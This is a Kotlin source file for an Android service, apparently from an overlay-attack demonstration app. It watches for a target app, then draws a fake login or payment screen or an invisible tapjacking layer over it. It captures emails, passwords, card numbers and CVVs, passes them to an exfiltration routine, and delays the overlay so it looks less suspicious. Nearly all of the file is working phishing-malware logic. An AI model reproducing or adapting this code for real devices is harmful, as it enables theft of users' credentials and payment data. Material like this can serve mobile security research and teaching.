package com.ghosttouch.attacker.service

import android.app.Service
import android.content.Intent
import android.os.Handler
import android.os.IBinder
import android.os.Looper
import android.util.Log
import com.ghosttouch.attacker.capture.SessionRepository
import com.ghosttouch.attacker.exfil.DataExfiltrator
import com.ghosttouch.attacker.overlay.FakeLoginOverlay
import com.ghosttouch.attacker.overlay.FakePaymentOverlay
import com.ghosttouch.attacker.overlay.OverlayManager
import com.ghosttouch.attacker.overlay.TapjackingOverlay

/**
 * Foreground service that orchestrates the overlay attack demo.
 *
 * ## Lifecycle
 * 1. Started via [startForegroundService] from the launcher activity
 * 2. Displays a persistent notification (required for foreground services on API 26+)
 * 3. Polls [ForegroundDetector] every [POLL_INTERVAL_MS] to check the current foreground app
 * 4. When the target app ([TARGET_PACKAGE]) is detected, triggers the overlay
 * 5. When the target app leaves the foreground, hides the overlay
 *
 * ## Attack modes
 * - **LOGIN**: Displays a fake login screen matching the target app's UI
 * - **PAYMENT**: Displays a fake payment screen
 * - **TAPJACKING**: Displays an invisible overlay for click interception
 *
 * ## Important
 * This service only functions when both SYSTEM_ALERT_WINDOW and PACKAGE_USAGE_STATS
 * permissions have been granted by the user.
 */
class OverlayService : Service() {

    private lateinit var foregroundDetector: ForegroundDetector
    private lateinit var overlayManager: OverlayManager
    private val handler = Handler(Looper.getMainLooper())
    private var isPolling = false

    /** The polling runnable that checks the foreground app periodically. */
    private val pollRunnable = object : Runnable {
        override fun run() {
            if (!isPolling) return

            val foregroundPackage = foregroundDetector.getCurrentForegroundPackage()

            if (foregroundPackage == TARGET_PACKAGE && !overlayManager.isShowing) {
                Log.d(TAG, "Target app detected: $foregroundPackage — triggering overlay")
                triggerOverlay()
            } else if (foregroundPackage != TARGET_PACKAGE && overlayManager.isShowing) {
                Log.d(TAG, "Target app left foreground — hiding overlay")
                overlayManager.hide()
            }

            // Schedule next poll
            handler.postDelayed(this, POLL_INTERVAL_MS)
        }
    }

    override fun onCreate() {
        super.onCreate()
        foregroundDetector = ForegroundDetector(applicationContext)
        overlayManager = OverlayManager(applicationContext)
        NotificationHelper.createChannel(this)
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        // Read attack mode from intent extras
        currentMode = intent?.getStringExtra(EXTRA_MODE) ?: MODE_LOGIN

        // Start as foreground service with persistent notification
        startForeground(NotificationHelper.NOTIFICATION_ID, NotificationHelper.buildServiceNotification(this))

        // Begin polling
        startPolling()

        Log.d(TAG, "OverlayService started — mode: $currentMode, target: $TARGET_PACKAGE")
        return START_STICKY
    }

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onDestroy() {
        stopPolling()
        overlayManager.hide()
        Log.d(TAG, "OverlayService destroyed")
        super.onDestroy()
    }

    /**
     * Starts the polling loop that monitors the foreground app.
     */
    private fun startPolling() {
        if (isPolling) return
        isPolling = true
        handler.post(pollRunnable)
    }

    /**
     * Stops the polling loop.
     */
    private fun stopPolling() {
        isPolling = false
        handler.removeCallbacks(pollRunnable)
    }

    /**
     * Triggers the appropriate overlay based on the current attack mode.
     *
     * Adds a configurable delay (300-500ms) to simulate realistic timing —
     * showing the overlay too fast might look suspicious to the user.
     */
    private fun triggerOverlay() {
        when (currentMode) {
            MODE_LOGIN -> overlayManager.show(delayMs = OVERLAY_DELAY_MS) {
                FakeLoginOverlay(
                    onCredentialsCaptured = { email, password ->
                        Log.d(TAG, "Credentials captured — email: $email")
                        val session = SessionRepository.captureLogin(
                            targetApp = TARGET_PACKAGE,
                            email = email,
                            password = password
                        )
                        // Simulate data exfiltration
                        DataExfiltrator.exfiltrate(session)
                    },
                    onDismiss = { overlayManager.hide() }
                )
            }

            MODE_PAYMENT -> overlayManager.show(delayMs = OVERLAY_DELAY_MS) {
                FakePaymentOverlay(
                    onPaymentCaptured = { cardNumber, expiry, cvv ->
                        Log.d(TAG, "Payment captured — card ending: ${cardNumber.takeLast(4)}")
                        val session = SessionRepository.capturePayment(
                            targetApp = TARGET_PACKAGE,
                            cardNumber = cardNumber,
                            expiry = expiry,
                            cvv = cvv
                        )
                        DataExfiltrator.exfiltrate(session)
                    },
                    onDismiss = { overlayManager.hide() }
                )
            }

            MODE_TAPJACKING -> overlayManager.showTapjacking {
                TapjackingOverlay(
                    onTapDetected = { x, y ->
                        Log.d(TAG, "Tapjacking: tap detected at ($x, $y)")
                    }
                )
            }
        }
    }

    companion object {
        private const val TAG = "OverlayService"

        /** Package name of the target app to overlay. */
        const val TARGET_PACKAGE = "com.wcdonalds.app"

        /** Polling interval for foreground app detection (milliseconds). */
        private const val POLL_INTERVAL_MS = 700L

        /** Delay before showing the overlay after detection (milliseconds). */
        private const val OVERLAY_DELAY_MS = 400L

        /** Intent extra key for attack mode. */
        const val EXTRA_MODE = "attack_mode"

        /** Attack modes. */
        const val MODE_LOGIN = "login"
        const val MODE_PAYMENT = "payment"
        const val MODE_TAPJACKING = "tapjacking"

        /** Current attack mode. */
        var currentMode = MODE_LOGIN
            private set
    }
}
